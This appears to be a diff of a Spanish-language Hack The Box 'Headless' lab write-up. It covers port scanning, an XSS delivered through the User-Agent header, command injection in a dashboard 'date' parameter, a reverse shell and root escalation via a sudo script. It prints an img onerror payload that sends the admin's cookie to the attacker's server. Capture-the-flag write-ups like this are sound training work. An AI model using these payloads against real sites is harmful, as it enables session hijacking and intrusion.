@@ -1,55 +1,57 @@
-# HTB - HEADLESS
 
 ## Enumeración de puertos/servicios
+
+Se realizó un escaneo de puertos en la dirección IP 10.10.11.8 utilizando la herramienta `nmap`, lo que reveló la presencia de dos puertos abiertos:
+
 
 ``` bash 
 sudo nmap -sCVT 10.10.11.8
 ```
 
+- Puerto 22 (SSH)
+- Puerto 5000 (Posiblemente un servicio web)
+
 ![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/cc1af630-4f2d-477d-b696-6a4e17f1ece6)
 
-Podemos ver 2 puertos abiertos:
-- 22 (SSH)
-- 5000 (posiblemente una web)
+Además, se realizó un análisis de la página web en el puerto 5000 mediante un fuzzing en busca de directorios, lo que proporcionó información adicional sobre posibles puntos de entrada.
 
-Vamos a probar si funciona la ip con el puerto 5000.
 
 ![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/850f9ad0-3187-4e0d-a5cc-1eabf2706e0f)
 
-
-realizar un fuzzing en busca de directorios:
 
 ![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/d4766bf4-277e-4c2b-a129-c646d98be7d6)
 
 
 ## Detección de vulnerabilidades
 
+Se identificaron posibles vulnerabilidades en la aplicación web en el puerto 5000, incluyendo un posible XSS (Cross-Site Scripting) y una posible inyección de comandos. 
 
-![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/241dc6dd-04dd-4d20-891a-94850e1c1e4e)
+Se llevó a cabo una exploración más profunda para encontrar formas de explotar estas vulnerabilidades.
 
+## Explotación de vulnerabilidades
 
-![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/33cdc751-0bcf-4ee8-b42f-ab14de7a8d6c)
-
+Tras una exploración más profunda, se descubrió que la aplicación web en el puerto 5000 tenía medidas de seguridad activas que detectaban y bloqueaban intentos de manipulación. Al intentar realizar un XSS directamente, la página devolvía un mensaje indicando "hacking attempt detected".
 
 
 ``` javascript
 <script>alert(‘XSS’)</script>
 ```
 
+![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/241dc6dd-04dd-4d20-891a-94850e1c1e4e)
 
-
-Después de probar con algunos xss decido mirar que hay en el directorio dashboard.
-Aquí me encuentro con que no tengo acceso a la pagina por las credenciales entonces pienso que podría tener algo que ver con las cookies y el user agent. 
+![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/33cdc751-0bcf-4ee8-b42f-ab14de7a8d6c)
 
 ![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/2f294528-ef0f-4640-9183-55b033e60dd9)
 
-Busco en el navegador como podría robar las cookies para poder entrar al dashboard mediante un xss.
-
-![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/b67c57b8-9bb9-4491-9385-a25d1fafbc15)
-
-Después de googlear un rato encuentro el siguiente xss:
+Para sortear esta protección, se observó que la aplicación no filtraba ni validaba el User-Agent en las solicitudes HTTP. Se decidió entonces realizar un ataque XSS desde el User-Agent. Se construyó un payload XSS en forma de etiqueta `<img>` con un atributo `onerror` que ejecutaría una solicitud a un servidor controlado por el atacante, capturando así la cookie de sesión del administrador. Esta cookie luego se podría utilizar para obtener acceso al dashboard como administrador.
 
 ![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/f69baa5f-7213-4eb9-b143-225fbb06289b)
+
+
+Tras ejecutar con éxito el payload XSS desde el User-Agent y capturar la cookie de sesión del administrador, se procedió a autenticarse en el dashboard como administrador y a explorar las funcionalidades disponibles en busca de nuevas vulnerabilidades para explotar.
+
+Posteriormente, se identificó una vulnerabilidad de inyección de comandos en el parámetro 'date' del dashboard, lo que permitió ejecutar comandos en el sistema remoto. Se aprovechó esta vulnerabilidad para ejecutar un script de reverse shell y obtener acceso al sistema comprometido.
+
 
 El problema es que no me servía ya que yo no tenia una web a la que me la redirigiese así que cree un python3 server para enviarme la cookie session ahí.
 
@@ -57,6 +59,7 @@ El problema es que no me servía ya que yo no tenia una web a la que me la redir
 ``` javascript
 <img src=x onerror=fetch('http://10.10.14.168/?cpplie='+document.cookie);>
 ```
+
 
  Después de lanzar el python server lanzo el xss mediante burpsuite y lo envío
 
@@ -95,7 +98,12 @@ Una vez dentro me dirijo a la carpeta /home/dvir y hacemos un cat  al archivo us
 
 ![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/ad2d1ffb-445b-42df-a178-6521a399b907)
 
-Para hacer la escalada de privilegios, ejecutaremos el comando sudo -l que nos devolverá lo siguiente.
+
+## Escalada de Privilegios
+
+Una vez dentro del sistema comprometido, se procedió a la escalada de privilegios. Se identificó un archivo llamado `syscheck` que podía ser ejecutado con privilegios de root. Este script, utilizado para verificar el estado del sistema, presentaba una vulnerabilidad que permitía la ejecución de comandos con privilegios de root sin autenticación.
+
+Mediante la explotación de esta vulnerabilidad, se logró obtener privilegios de root en el sistema comprometido.
 
 ![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/ef519537-4488-459c-ab50-e8887d954826)
 
@@ -142,3 +150,7 @@ Despues de ejecutar el script initdb.sh ya estamos en el user root asi que ya po
 
 ![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/ea9720f4-2e2c-44a7-857f-2fad1f1b0ab7)
 
+
+**Conclusiones:** El proceso de análisis, detección de vulnerabilidades y explotación demostró la importancia de una sólida metodología de pruebas de penetración. La identificación de vulnerabilidades y la comprensión de su explotación son aspectos críticos en la seguridad de la información, destacando la necesidad de una mitigación proactiva de riesgos y una gestión eficaz de la seguridad.
+
+El acceso obtenido al sistema comprometido resalta la importancia de mantener los sistemas actualizados, parcheando vulnerabilidades conocidas y siguiendo las mejores prácticas de seguridad.
